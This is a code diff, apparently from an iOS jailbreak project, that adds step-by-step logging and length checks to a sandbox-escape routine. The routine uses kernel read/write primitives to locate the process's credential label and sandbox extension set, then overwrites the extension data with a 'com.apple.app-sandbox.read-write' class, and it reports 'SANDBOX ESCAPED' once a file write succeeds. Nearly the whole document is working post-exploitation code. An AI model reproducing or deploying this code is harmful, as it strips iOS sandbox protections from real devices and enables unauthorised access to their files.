@@ -10,6 +10,7 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
+#include <stdio.h>
 #include <sys/stat.h>
 #include "sandbox_escape.h"
 #include "kexploit_opa334.h"
@@ -19,6 +20,7 @@
 #include "xpaci.h"
 
 #define KRW_LEN 0x20
+#define SBX_LOG(...) do { printf(__VA_ARGS__); printf("\n"); fflush(stdout); } while (0)
 
 #define OFF_PROC_PROC_RO       0x18
 #define OFF_PROC_RO_UCRED      0x20
@@ -50,16 +52,29 @@ extern bool gIsPACSupported;
 static void patch_ext(uint64_t ext) {
     uint64_t da = early_kread64(ext + OFF_EXT_DATA);
     uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
-    if (K(da) && dl > 0) {
-        uint8_t buf[KRW_LEN];
-        early_kread(da, buf, KRW_LEN);
-        buf[0] = '/'; buf[1] = 0;
-        early_kwrite32bytes(da, buf);
+    if (!K(da)) {
+        SBX_LOG("[SBX] patch_ext skipped: invalid data pointer ext=0x%llx", (unsigned long long)ext);
+        return;
     }
+    if (dl < KRW_LEN) {
+        SBX_LOG("[SBX] patch_ext skipped: declared data length too small ext=0x%llx len=0x%llx",
+                 (unsigned long long)ext, (unsigned long long)dl);
+        return;
+    }
+
+    SBX_LOG("[SBX] patch_ext: ext=0x%llx data=0x%llx declaredLen=0x%llx",
+             (unsigned long long)ext, (unsigned long long)da, (unsigned long long)dl);
+    uint8_t buf[KRW_LEN];
+    early_kread(da, buf, KRW_LEN);
+    buf[0] = '/'; buf[1] = 0;
+    SBX_LOG("[SBX] patch_ext write path block: target=0x%llx length=0x20", (unsigned long long)da);
+    early_kwrite32bytes(da, buf);
+
     uint8_t chunk[KRW_LEN];
     early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
     *(uint64_t*)(chunk + 0x08) = 1;
     *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
+    SBX_LOG("[SBX] patch_ext write extension fields: target=0x%llx length=0x20", (unsigned long long)(ext + OFF_EXT_DATA));
     early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
 }
 
@@ -77,20 +92,39 @@ static int patch_chain(uint64_t hdr) {
 
 static void set_rw_class(uint64_t hdr) {
     uint64_t ext = S(early_kread64(hdr + 0x8));
-    if (!K(ext)) return;
+    if (!K(ext)) {
+        SBX_LOG("[SBX] set_rw_class skipped: invalid extension header=0x%llx", (unsigned long long)hdr);
+        return;
+    }
     uint64_t da = early_kread64(ext + OFF_EXT_DATA);
-    if (!K(da)) return;
+    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
+    if (!K(da)) {
+        SBX_LOG("[SBX] set_rw_class skipped: invalid data pointer ext=0x%llx", (unsigned long long)ext);
+        return;
+    }
+    // The class string and its terminating zero block occupy bytes [32, 96).
+    // Do not issue either 32-byte write unless the extension reports that range.
+    if (dl < 0x60 || da > UINT64_MAX - 0x60) {
+        SBX_LOG("[SBX] set_rw_class skipped: data range too short ext=0x%llx data=0x%llx len=0x%llx",
+                 (unsigned long long)ext, (unsigned long long)da, (unsigned long long)dl);
+        return;
+    }
 
     const char *rw = "com.apple.app-sandbox.read-write";
     uint8_t b1[KRW_LEN], b2[KRW_LEN];
     memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
     memcpy(b1, rw, KRW_LEN);
+    SBX_LOG("[SBX] set_rw_class write class string: target=0x%llx length=0x20 declaredLen=0x%llx",
+             (unsigned long long)(da + 32), (unsigned long long)dl);
     early_kwrite32bytes(da + 32, b1);
+    SBX_LOG("[SBX] set_rw_class write class terminator: target=0x%llx length=0x20 declaredLen=0x%llx",
+             (unsigned long long)(da + 64), (unsigned long long)dl);
     early_kwrite32bytes(da + 64, b2);
 
     uint8_t hb[KRW_LEN];
     early_kread(hdr, hb, KRW_LEN);
     *(uint64_t*)(hb + 0x10) = da + 32;
+    SBX_LOG("[SBX] set_rw_class write header pointer: target=0x%llx length=0x20", (unsigned long long)hdr);
     early_kwrite32bytes(hdr, hb);
 }
 
@@ -102,7 +136,11 @@ static BOOL probe_write_read_delete(const char *directoryPath) {
     const char *path = probePath.fileSystemRepresentation;
 
     int fd = open(path, O_RDWR | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
-    if (fd < 0) return NO;
+    if (fd < 0) {
+        int savedErrno = errno;
+        SBX_LOG("[SBX] access probe open failed: path=%s errno=%d", path, savedErrno);
+        return NO;
+    }
 
     const uint8_t expected = 0x31;
     uint8_t actual = 0;
@@ -113,12 +151,15 @@ static BOOL probe_write_read_delete(const char *directoryPath) {
         : -1;
     int closeResult = close(fd);
     int unlinkResult = unlink(path);
-
-    return writeResult == sizeof(expected) &&
+    BOOL passed = writeResult == sizeof(expected) &&
         readResult == sizeof(actual) &&
         actual == expected &&
         closeResult == 0 &&
         unlinkResult == 0;
+    SBX_LOG("[SBX] access probe %s: path=%s write=%ld read=%ld close=%d unlink=%d errno=%d",
+             passed ? "passed" : "failed", path, (long)writeResult,
+             (long)readResult, closeResult, unlinkResult, errno);
+    return passed;
 }
 
 int sandbox_access_is_active(void) {
@@ -141,12 +182,14 @@ int sandbox_access_is_active(void) {
 }
 
 int sandbox_escape(uint64_t self_proc) {
-    if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }
+    SBX_LOG("[SBX] stage 1/8: resolve current process credentials");
+    if (!self_proc) { SBX_LOG("[SBX] stage 1/8 failed: self_proc is NULL"); return -1; }
 
     uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
     uint64_t proc_ro = S(proc_ro_raw);
-    if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }
+    if (!K(proc_ro)) { SBX_LOG("[SBX] stage 1/8 failed: proc_ro invalid"); return -1; }
 
+    SBX_LOG("[SBX] stage 2/8: locate ucred");
     uint64_t ucred = 0;
     for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
         uint64_t raw = early_kread64(proc_ro + off);
@@ -174,29 +217,37 @@ int sandbox_escape(uint64_t self_proc) {
             }
         }
     }
-    if (!K(ucred)) { NSLog(@"[SBX] ucred not found"); return -1; }
+    if (!K(ucred)) { SBX_LOG("[SBX] stage 2/8 failed: ucred not found"); return -1; }
 
+    SBX_LOG("[SBX] stage 3/8: resolve credential label");
     uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
-    if (!K(label)) { NSLog(@"[SBX] cr_label invalid"); return -1; }
+    if (!K(label)) { SBX_LOG("[SBX] stage 3/8 failed: cr_label invalid"); return -1; }
 
+    SBX_LOG("[SBX] stage 4/8: resolve sandbox and extension set");
     uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
-    if (!K(sandbox)) { NSLog(@"[SBX] sandbox invalid"); return -1; }
+    if (!K(sandbox)) { SBX_LOG("[SBX] stage 4/8 failed: sandbox invalid"); return -1; }
 
     uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
-    if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }
+    if (!K(ext_set)) { SBX_LOG("[SBX] stage 4/8 failed: ext_set invalid"); return -1; }
 
+    SBX_LOG("[SBX] stage 5/8: patch existing extension chains");
     int patched = 0;
     for (int s = 0; s < 16; s++) {
         uint64_t hdr = S(early_kread64(ext_set + s * 8));
         if (K(hdr)) patched += patch_chain(hdr);
     }
 
+    SBX_LOG("[SBX] stage 5/8 complete: extension nodes visited=%d", patched);
+
+    SBX_LOG("[SBX] stage 6/8: install read-write extension class");
     int classed = 0;
     for (int s = 0; s < 16; s++) {
         uint64_t hdr = S(early_kread64(ext_set + s * 8));
         if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
     }
+    SBX_LOG("[SBX] stage 6/8 complete: eligible headers visited=%d", classed);
 
+    SBX_LOG("[SBX] stage 7/8: fill empty extension-set slots");
     uint64_t src = 0;
     for (int s = 0; s < 16 && !src; s++) {
         uint64_t h = S(early_kread64(ext_set + s * 8));
@@ -210,11 +261,14 @@ int sandbox_escape(uint64_t self_proc) {
         }
     }
 
+    SBX_LOG("[SBX] stage 7/8 complete: extension-set slots processed");
+    SBX_LOG("[SBX] stage 8/8: verify write/read/delete access");
     if (sandbox_access_is_active()) {
-        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W) ***");
+        SBX_LOG("[SBX] stage 8/8 passed: *** SANDBOX ESCAPED (R+W) ***");
         return 0;
     }
 
+    SBX_LOG("[SBX] stage 8/8 failed: write/read/delete verification did not pass");
     return -1;
 }
 
